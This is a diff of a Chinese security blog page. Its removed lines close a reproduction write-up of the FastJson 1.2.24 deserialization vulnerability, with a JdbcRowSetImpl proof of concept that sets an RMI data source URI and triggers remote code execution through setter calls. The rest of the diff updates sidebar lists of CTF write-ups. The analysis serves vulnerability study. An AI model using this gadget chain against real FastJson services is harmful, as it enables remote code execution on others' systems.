-<pre><code>ublic void setValue(Object object, Object value) {
-        if (value == null //
-            &amp;&amp; fieldInfo.fieldClass.isPrimitive()) {
-            return;
-        }
-
-        try {
-            Method method = fieldInfo.method;
-            if (method != null) {
-                if (fieldInfo.getOnly) {
-                    ...
-                } else {
-                    method.invoke(object, value);
-                }
-                return;
-            } else {
-                ...
-            }
-        } catch (Exception e) {
-            throw new JSONException(&quot;set property error, &quot; + fieldInfo.name, e);
-        }
-    }</code></pre><p>进入对应字段的set或者get方法</p>
-<p>至此FastJson的洞已经分析完了，接下来就是如何利用这个任意set/get方法调用从而RCE了<br>因为以下payload能成功</p>
-<pre><code class="java">import com.sun.rowset.JdbcRowSetImpl;
-
-public class CLIENT {
-
-    public static void main(String[] args) throws Exception {
-        JdbcRowSetImpl JdbcRowSetImpl_inc = new JdbcRowSetImpl();//只是为了方便调用
-        JdbcRowSetImpl_inc.setDataSourceName(&quot;rmi://127.0.0.1:1099/aa&quot;);//可控uri
-        JdbcRowSetImpl_inc.setAutoCommit(true);
-    }
-}</code></pre>
-<p>且符合</p>
-<ul>
-<li><input checked="" disabled="" type="checkbox"> 方法名长度大于4且以set开头，且第四个字母要是大写</li>
-<li><input checked="" disabled="" type="checkbox"> 非静态方法</li>
-<li><input checked="" disabled="" type="checkbox"> 返回类型为void或当前类</li>
-<li><input checked="" disabled="" type="checkbox"> 参数个数为1个<br>这些条件<br>RCE达成</li>
-</ul>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/10/05/FastJson1.2.24调试记录_复现/">http://blog.ccreater.top/2020/10/05/FastJson1.2.24调试记录_复现/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/10/05/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/" data-id="ckfwpyx8a0000v4vd2fds71fn" data-title="FastJson1.2.24调试记录_复现" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/java/" rel="tag">java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%A4%8D%E7%8E%B0/" rel="tag">复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -2618,7 +2494,7 @@ public class CLIENT {
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">July 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
     </div>
   </div>
 
@@ -2629,6 +2505,10 @@ public class CLIENT {
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2020/12/14/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
+          </li>
         
           <li>
             <a href="/2020/11/27/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
@@ -2644,10 +2524,6 @@ public class CLIENT {
         
           <li>
             <a href="/2020/11/12/Academy_write_up/">Academy_write_up</a>
-          </li>
-        
-          <li>
-            <a href="/2020/10/26/2020ByteCTF/">2020ByteCTF</a>
           </li>
         
       </ul>
